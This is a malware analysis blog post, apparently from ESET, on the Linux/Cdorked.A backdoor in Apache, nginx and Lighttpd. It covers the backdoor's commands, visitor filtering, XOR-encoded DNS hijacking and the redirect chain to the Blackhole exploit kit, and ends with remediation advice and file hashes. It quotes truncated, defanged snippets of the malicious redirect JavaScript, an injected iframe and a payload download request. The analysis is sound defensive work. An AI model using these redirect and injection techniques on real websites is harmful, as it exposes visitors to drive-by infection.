@@ -1,0 +1,247 @@
+Linux/Cdorked.A malware: Lighttpd and nginx web servers also affected
+Some 400 web servers found infected with Linux/Cdorked.A. including 50 in Alexa’s top 100,000 websites. And this backdoor has been applied to Lighttpd and nginx binaries in addition to Apache.
+
+7 May 2013 - 03:20PM
+
+Some 400 web servers found infected with Linux/Cdorked.A. including 50 in Alexa’s top 100,000 websites. And this backdoor has been applied to Lighttpd and nginx binaries in addition to Apache.
+
+Our investigation around Linux/Cdorked.A continues. Since our initial post about this sophisticated and stealthy backdoor designed to drive traffic to malicious websites, we have made further significant discoveries:
+
+We have observed more than 400 webservers infected with Linux/Cdorked.A. Out of these, 50 are ranked in Alexa’s top 100,000 most popular websites.
+The backdoor has been applied to other webserver daemons. Thanks to the information provided by affected system administrators, we were able to analyze trojanized Lighttpd and nginx binaries in addition to the already documented Apache binaries.
+According to our global telemetry data, this operation has been active since at least December 2012.
+The Linux/Cdorked.A threat is even more stealthy than we first thought: By analysing how the attackers are configuring the backdoor, we found it will not deliver malicious content if the victim’s IP address is in a very long list of blacklisted IP ranges, nor if the victim’s internet browser’s language is set to Japanese, Finnish, Russian and Ukrainian, Kazakh or Belarusian.
+Our telemetry data shows that almost 100,000 users of ESET security products have browsed infected websites due to Linux/Cdorked.A redirection, although the attack was blocked by those products.
+In some of the configurations we were able to analyze, specific redirections were configured for Apple iPad and iPhone users.
+
+In this blog post, we will provide additional information on the capabilities of the backdoor. We will also describe the typical configurations we were able to analyze and the malicious payload that was delivered to victims. In a typical attack scenario, victims are redirected to a malicious web server hosting a Blackhole exploit kit. We have discovered that this malicious infrastructure uses compromised DNS servers, something that is out of the ordinary. We will provide more information on this peculiarity in the last section of this post.
+
+Before going any further, one point needs to be clear about Linux/Cdorked.A. We still don’t know for sure how this malicious software was deployed on the web servers. We believe the infection vector is not unique. It cannot be attributed solely to installations of cPanel because only a fraction of the infected servers are using this management software. One thing is clear, this malware does not propagate by itself and it does not exploit a vulnerability in a specific software. Linux/Cdorked.A is a backdoor, used by malicious actor to serve malicious content from legitimate websites.
+
+The following image shows the assembly listing of the reverse connect back shell invocation from the three types of backdoored binaries we were able to analyze: Lighttpd, nginx, and apache, shown here in that order:
+
+Lighttpd
+
+nginx
+
+Apache
+
+The backdoor code looks the same between the three variants, but the hooks are inside different functions depending on the server and the structures are also different. The attacker was serious enough to take the time to create a set of patches for each web server’s source code.
+
+Linux/Cdorked.A Backdoor capabilities
+
+Our analysis revealed more about the commands described in our previous post. Here is the list of commands available to control Linux/Cdorked.A.
+
+Command
+Functionality
+
+L1, D1
+Load or delete the list of redirect URL
+
+L2, D2
+Load or delete the list of blacklisted IP ranges
+
+L3, D3
+Load or delete the list of User-Agent whitelist pattern
+
+L4, D4
+Load or delete the list of User-Agent blacklist pattern
+
+L6, D6
+Load or delete the list of blacklisted IP
+
+L7, D7
+Load or delete the list of request excluded pages
+
+L8, D8
+Load or delete the list of whitelisted IP ranges
+
+L9, D9
+Load or delete the list of Accept-Language blacklisted patterns
+
+LA, DA
+Load or delete the list of request whitelisted pages
+
+ST
+Print server stats
+
+DU
+Clear the list of redirected IPs
+
+T1
+A timestamp, still under analysis
+
+Those lists are stored in the shared memory segment detected by our tool. They give the attacker a way to be very precise about whom to redirect or not. Linux/Cdorked.A also keeps a list of IPs it has redirected with a timestamp the avoid redirecting the same victim twice within a small period of time. None of the configuration is stored to disk, it remains in memory and is modified by the attacker through HTTP requests on the infected webserver.
+
+Typical Linux/Cdorked.A configuration
+
+Thanks to system administrators and Sucuri, we were able to get our hands on the shared memory segment used by some instances of Linux/Cdorked.A. Dumps from the same period of time had similar configuration. The following screenshot shows an example of a memory dump.
+
+We have not seen any configuration so far with more than one URL. The redirect is served to visitors who use Internet Explorer or Firefox on Microsoft Windows XP, Vista or 7. Users of Apple iPhone and iPad are also targeted, however they are not directed to the exploit kit but instead served a page with links to pornographic websites.  The following screenshot shows redirection on an iPhone.
+
+The Linux/Cdorked.A configuration also included a huge list of blacklisted IP ranges. Visitors to a site compromised by Linux/Cdorked.A, who come from these IP ranges, will never be redirected to malicious content. In the configurations we examined, about 50% of the Internet IPv4 space was blocked with no apparent regard to geographic location. Furthermore, the configuration also blocks users based on their browser’s configured language in the Accept-Language HTTP header.
+
+Language check blacklist (L9) - 8 entries
+-----------------------------------------
+ja Japanese
+jp country code for Japan
+fi Finnish
+ru Russian
+uk Ukrainian
+be Belarusian
+kk Kazakh
+zn No such language code
+
+12345678910
+
+Language check blacklist (L9) - 8 entries-----------------------------------------ja Japanesejp country code for Japanfi Finnishru Russianuk Ukrainianbe Belarusiankk Kazakhzn No such language code
+
+We believe the operators behind this malware campaign are making significant efforts to keep their operation under the radar and to hinder monitoring efforts as much as possible. For them, not being detected seems to be a priority over infecting as many victims as possible.
+
+Redirection Statistics
+
+The malicious redirections all have something in common: the Blackhole instance where visitors are redirected have the “/info/last” pattern in the URL. The earliest traces of this campaign in our telemetry data based on the “/info/last/” pattern are from December 24th, 2012, and were using the same DNS patterns that we will describe in the next section.
+
+By analyzing web traffic to the target webpages, we were able to identify a little over 400 websites which are currently affected by Linux/Cdorked.A. Out of these webservers, 50 are in the top 100,000 websites as ranked by Alexa, the highest ranked being in the top 2,000 most visited website on the Internet. However, some people are already cleaning their servers after we published our first analysis which is definitely encouraging.
+
+Linux/Cdorked.A keeps a timestamp of the last redirection for each victim’s IP address. We were able to extract that information from the memory dumps to estimate how many redirections a single server can serve each day. We’ve seen a server redirecting over 28,000 requests within 24 hours. What we observe is that servers are not constantly active. Here are two examples showing the numbers of redirection per day for a single server.
+
+DNS Hijacking
+
+The URLs set on the Linux/Cdorked.A infected servers change frequently. However we noticed three things:
+
+The domain often looks like <number(s), a, b or c><letters>.<tld>.
+The subdomain always matches a 16 character hexadecimal string.
+The name servers of these domains change much less frequently than the domains themselves.
+
+So we began analysing the pattern of the domain name used as target of the redirection. First, we realised that the numbers at the beginning of the domains were simply because the servers hosting these sites were shared hosting servers, and, when sorting the domains alphabetically, were the first associated with the IP address of the server.
+
+The peculiar format of the subdomains and the fact that they are constantly changing strongly suggested that the DNS servers were also compromised. We did some tests where we modified the characters of the subdomain and in some cases the IP address in the response changed. With some more testing we were able to confirm that the IP address returned by the DNS request is actually encoded in the subdomain itself. It is using the characters at odd positions to form a 4 bytes long hex string to decode the IP address from. A basic chained XOR cipher is used to encode the IP address.
+
+The decoding algorithm looks like this:
+
+byte[] = { 16, 70, 183, 11 } // From the hex string
+seed = 49 // This seed changes, we have not yet found where it comes for
+ip[0] = seed ^ byte[0]    // 33
+ip[1] = byte[0] ^ byte[1] // 86
+ip[2] = byte[1] ^ byte[2] // 241
+ip[3] = byte[2] ^ byte[3] // 188
+// This gives us a response with IP 188.241.86.33
+
+1234567
+
+byte[] = { 16, 70, 183, 11 } // From the hex stringseed = 49 // This seed changes, we have not yet found where it comes forip[0] = seed ^ byte[0]    // 33ip[1] = byte[0] ^ byte[1] // 86ip[2] = byte[1] ^ byte[2] // 241ip[3] = byte[2] ^ byte[3] // 188// This gives us a response with IP 188.241.86.33
+
+Due to the algorithmic nature of this behavior, we see no other explanation than the presence of trojanized DNS server binaries on the nameservers involved in Linux/CDorked.A. ESET has notified the affected parties about this issue.
+
+Redirection Chain
+
+When visitors are redirected by Linux/Cdorked.A they pass through multiple pages before reaching the Blackhole Exploit kit. The following screenshot shows an example redirection chain.
+
+The first page is /index.php with a base64 encoded parameter documented in our last article. In the example in the previous screenshot, the base64 would decode to
+
+ljroujxv=isiuzv&amp;time=1305022208-2007115935&amp;src=141
+&amp;surl=somedomain.com&amp;sport=80&amp;key=ED143377&amp;suri=/tr/zeki.htm.
+
+12
+
+ljroujxv=isiuzv&amp;time=1305022208-2007115935&amp;src=141&amp;surl=somedomain.com&amp;sport=80&amp;key=ED143377&amp;suri=/tr/zeki.htm.
+
+That first page contains JavaScript code that will redirect the user to the second page.
+
+var iflag = "0"; if (top!=self) { iflag = "1"; };
+var b64str = "MTQxNDExMzA1MDIyMjQ4M...luLmNvbS9zb3J0LnBocA==";
+setTimeout ( function() { location.replace( "hxxp://ae334b05c4249f38" + iflag
++ b64dec(b64str) ); }, 280);
+
+1234
+
+var iflag = "0"; if (top!=self) { iflag = "1"; };var b64str = "MTQxNDExMzA1MDIyMjQ4M...luLmNvbS9zb3J0LnBocA==";setTimeout ( function() { location.replace( "hxxp://ae334b05c4249f38" + iflag + b64dec(b64str) ); }, 280);
+
+The URL for the second page is composed of 3 parts: the initial subdomain, the iflag value and the b64str variable provided by the server. The iflag value is set to 1 if the current document is the top window in the browser. The server would likely reject requests in such cases. The content of b64str is provided by the server and contains an URL with a very long subdomain part:
+
+1414113050222483098587bcf02fc1731aade45f74550b.somedomain.com/sort.php
+
+1
+
+1414113050222483098587bcf02fc1731aade45f74550b.somedomain.com/sort.php
+
+This third part contains some specific information about the current redirection, such as the the src id from the Linux/Cdorked.A initial URL and a timestamp. The significance of the other characters is still currently unknown.
+
+The third page, sort.php, sets a timeout to redirect the user to the fourth page, exit.php.
+
+function gotime() { xflag=false; top.location.replace(b64dec("aHR0cDovL2FlMzM0YjA1YzQyNDlmM...
+...cD94PTEzNyZ0PXRpbWVvdXQ=")); };
+var timer=setTimeout("gotime()", 21000);
+var ewq;
+ewq=document.createElement("span");
+ewq.innerHTML=b64dec("PGlmcmFtZSBzcmM9Im...1lPjxicj4=");
+setTimeout(function() { document.body.insertBefore(ewq,document.body.lastChild); }, 504);
+
+1234567
+
+function gotime() { xflag=false; top.location.replace(b64dec("aHR0cDovL2FlMzM0YjA1YzQyNDlmM......cD94PTEzNyZ0PXRpbWVvdXQ=")); };var timer=setTimeout("gotime()", 21000);var ewq;ewq=document.createElement("span");ewq.innerHTML=b64dec("PGlmcmFtZSBzcmM9Im...1lPjxicj4=");setTimeout(function() { document.body.insertBefore(ewq,document.body.lastChild); }, 504);
+
+aHr...XQ= : hxxp://ae334b05c4249f38014141130...
+...50222483098587bcf02fc1731aade45f74550b.somedomain.com/exit.php?x=137&amp;t=timeout
+
+12
+
+aHr...XQ= : hxxp://ae334b05c4249f38014141130......50222483098587bcf02fc1731aade45f74550b.somedomain.com/exit.php?x=137&amp;t=timeout
+
+Content of a typical sort.php page.
+
+This page shows pornographic images and links to pornographic websites and contains an iframe leading right into the Blackhole landing page. It is still unclear if the pornographic domains are actually malicious or part of a referral program.
+
+PGI...j4= : &lt;iframe src="hxxp://ae334b05c4249f38014141130502224830...
+...98587bcf02fc1731aade45f74550b.somedomain.com/info/last/index.php"
+width="120" height="21" marginwidth="0" marginheight="0" frameborder="0"
+scrolling="no" allowtransparency="true"&gt;&lt;/iframe&gt;&lt;br&gt;
+
+1234
+
+PGI...j4= : &lt;iframe src="hxxp://ae334b05c4249f38014141130502224830......98587bcf02fc1731aade45f74550b.somedomain.com/info/last/index.php"width="120" height="21" marginwidth="0" marginheight="0" frameborder="0"scrolling="no" allowtransparency="true"&gt;&lt;/iframe&gt;&lt;br&gt;
+
+iframe leading to the Blackhole landing page.
+
+Finally, if the Blackhole exploit pack is successful, a piece of malware is downloaded on the victim’s computer.
+
+GET /get3.php?e=176541242&amp;tc=1305022250-072800c977&amp;uid=536201305032119591656771 HTTP/1.0
+Host: ae334b05c4249f38.somedomain.com
+User-Agent: NSISDL/1.2 (Mozilla)
+Accept: */*
+
+1234
+
+GET /get3.php?e=176541242&amp;tc=1305022250-072800c977&amp;uid=536201305032119591656771 HTTP/1.0Host: ae334b05c4249f38.somedomain.comUser-Agent: NSISDL/1.2 (Mozilla)Accept: */*
+
+1
+
+<span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px;">Our tests and telemetry data show that the malware that is currently being installed by the Blackhole exploit pack is Win32/Glupteba.G.</span>
+
+1
+
+<span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px;">Our tests and telemetry data show that the malware that is currently being installed by the Blackhole exploit pack is Win32/Glupteba.G.</span>
+
+Remediation
+
+As mentioned in our previous post, we recommend system administrators check the integrity of their webservers using their standard packaging systems.  We have published a tool to dump the configuration of Linux/Cdorked.A if it is found running on a webserver. We updated it last week to detect all variants we are aware of, including nginx and Lighttpd.
+
+As for web users, we recommend keeping browsers, browser extensions, operating systems, and third party software like Java, PDF readers and Flash players fully up-to-date to avoid being infected by this on-going campaign. Use of an antivirus program is also recommended.
+
+Thanks
+
+This article is the result of a joint effort between Marc-Etienne M.Léveillé, Mathieu Lavoie, Benjamin Vanheuverzwijn, Sébastien Duquette and Pierre-Marc Bureau.
+
+Analysed files: SHA1 hashes
+
+a53a30f8cdf116de1b41224763c243dae16417e4 bad-apache
+a51b1835abee79959e1f8e9293a9dcd8d8e18977 bad-nginx
+dd7846b3ec2e88083cae353c02c559e79124a745 bad-lighthttpd
+ee679661829405d4a57dbea7f39efeb526681a7f bad-apache-x64-with-symbols
+5b87807b4a1796cfb1843df03b3dca7b17995d20 bad-apache-i386
+03592b8147e2c84233da47f6e957acd192b3796a bad-apache
+
+123456
+
+a53a30f8cdf116de1b41224763c243dae16417e4 bad-apachea51b1835abee79959e1f8e9293a9dcd8d8e18977 bad-nginxdd7846b3ec2e88083cae353c02c559e79124a745 bad-lighthttpdee679661829405d4a57dbea7f39efeb526681a7f bad-apache-x64-with-symbols5b87807b4a1796cfb1843df03b3dca7b17995d20 bad-apache-i38603592b8147e2c84233da47f6e957acd192b3796a bad-apache
